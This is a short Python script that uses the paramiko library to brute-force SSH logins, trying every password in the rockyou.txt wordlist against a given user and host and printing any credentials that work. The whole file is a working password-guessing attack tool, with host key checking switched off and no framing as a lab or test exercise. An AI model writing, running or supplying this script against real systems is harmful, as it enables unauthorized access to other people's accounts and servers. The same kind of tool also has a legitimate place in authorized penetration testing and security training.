import paramiko
import sys

def ssh_attempt(user, host, password):
    client = paramiko.SSHClient()

    try:
        # Automatically add the host key
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(host, username=user, password=password)

        print(f"[+] Successful login to {host}  \nuser: {user}  \npassword: {password}")
        exit(0)
    except paramiko.AuthenticationException:
        print(f"[-] Authentication failed {user} : {password}")
    except paramiko.SSHException as e:
        print(f"SSH error occurred: {str(e)}")
    finally:
        client.close()

def main():
    if len(sys.argv) != 3:
        print("Usage: python ssh.py <user> <host>")
        return

    user = sys.argv[1]
    host = sys.argv[2]

    password_list="/usr/share/wordlists/rockyou.txt"
    with open(password_list, "r", encoding='latin-1' ) as f:
        passwords = f.read().splitlines()

    for password in passwords:
        ssh_attempt(user, host, password)

if __name__ == "__main__":
    main()
